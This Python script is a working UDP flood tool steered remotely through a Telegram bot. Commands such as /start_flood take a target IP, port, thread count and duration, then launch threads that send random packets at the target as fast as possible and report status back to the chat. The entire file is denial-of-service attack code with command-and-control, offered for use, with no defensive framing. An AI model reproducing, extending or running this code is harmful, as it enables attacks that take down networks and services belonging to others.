import os
import sys
import json
import time
import random
import socket
import threading
import requests
from pathlib import Path

# ------------------------------------------------------------------
# Configuration â€“ read from environment or .env
# ------------------------------------------------------------------
try:
    from dotenv import load_dotenv
    load_dotenv()          # read .env file if present
except ImportError:
    # dotenv not installed â€“ continue; values must be in env
    pass

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID   = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    print("[!] BOT_TOKEN and CHAT_ID must be set in env or .env")
    sys.exit(1)

# ------------------------------------------------------------------
# Telegram helper â€“ send a message
# ------------------------------------------------------------------
def send_telegram_message(text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=5)
        r.raise_for_status()
        return True
    except Exception as exc:
        print(f"[!] Telegram error: {exc}")
        return False

# ------------------------------------------------------------------
# UDP worker â€“ sends packets as fast as possible
# ------------------------------------------------------------------
def udp_worker(target_ip: str, target_port: int, packet_size: int, stop_event: threading.Event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        # Random payload: keeps packet_size bytes but changes content each time
        payload = os.urandom(packet_size)
        try:
            sock.sendto(payload, (target_ip, target_port))
        except Exception as exc:
            # In case of a transient error, just continue
            print(f"[!] Worker error: {exc}")
            continue
    sock.close()

# ------------------------------------------------------------------
# Flood controller â€“ starts/stops workers
# ------------------------------------------------------------------
class FloodController:
    def __init__(self):
        self.stop_event = threading.Event()
        self.threads   = []

    def start(self, ip: str, port: int, threads: int, duration: int, packet_size: int = 1024):
        if self.threads:
            send_telegram_message("<b>â— Flood already running. Stop it first.</b>")
            return

        self.stop_event.clear()
        self.threads = []

        for _ in range(threads):
            t = threading.Thread(
                target=udp_worker,
                args=(ip, port, packet_size, self.stop_event),
                daemon=True,
            )
            t.start()
            self.threads.append(t)

        send_telegram_message(
            f"<b>ðŸš€ UDP Flood started!</b>\n"
            f"Target: <code>{ip}:{port}</code>\n"
            f"Threads: <code>{threads}</code>\n"
            f"Packet size: <code>{packet_size}</code> bytes\n"
            f"Duration: <code>{duration}</code> seconds"
        )

        # Automatically stop after duration
        threading.Timer(duration, self.stop).start()

    def stop(self):
        if not self.threads:
            send_telegram_message("<b>âš ï¸ No flood in progress.</b>")
            return

        self.stop_event.set()
        for t in self.threads:
            t.join(timeout=1)

        self.threads = []
        send_telegram_message("<b>âœ… Flood stopped.</b>")

# ------------------------------------------------------------------
# Telegram command parser
# ------------------------------------------------------------------
def parse_command(message: str):
    """
    Expected format:
    /start_flood <IP> <PORT> <THREADS> <DURATION>
    /stop_flood
    """
    parts = message.strip().split()
    if not parts:
        return None

    cmd = parts[0].lower()
    if cmd == "/start_flood" and len(parts) == 5:
        try:
            ip = parts[1]
            port = int(parts[2])
            threads = int(parts[3])
            duration = int(parts[4])
            return ("start", ip, port, threads, duration)
        except ValueError:
            return ("error", "Invalid numeric values.")
    elif cmd == "/stop_flood":
        return ("stop",)
    else:
        return ("error", "Unrecognized command.")

# ------------------------------------------------------------------
# Polling loop â€“ checks for new messages
# ------------------------------------------------------------------
def poll_telegram_updates():
    """
    Simple longâ€‘polling implementation. Keeps track of last update_id.
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    last_update_id = None

    controller = FloodController()

    while True:
        params = {"timeout": 60}
        if last_update_id:
            params["offset"] = last_update_id + 1
        try:
            resp = requests.get(url, params=params, timeout=70)
            resp.raise_for_status()
            data = resp.json()
            if not data.get("ok"):
                print("[!] Telegram API error:", data)
                continue

            for update in data.get("result", []):
                last_update_id = update["update_id"]
                message = update.get("message")
                if not message:
                    continue
                text = message.get("text", "")
                if not text:
                    continue

                parsed = parse_command(text)
                if not parsed:
                    continue

                if parsed[0] == "start":
                    _, ip, port, threads, duration = parsed
                    controller.start(ip, port, threads, duration)
                elif parsed[0] == "stop":
                    controller.stop()
                elif parsed[0] == "error":
                    send_telegram_message(f"<b>âŒ Error:</b> {parsed[1]}")
        except Exception as exc:
            print("[!] Polling error:", exc)
            time.sleep(5)  # brief backâ€‘off

# ------------------------------------------------------------------
# Entry point
# ------------------------------------------------------------------
if __name__ == "__main__":
    print("[*] UDP Flood Telegram Bot is running. Awaiting commands...")
    poll_telegram_updates()
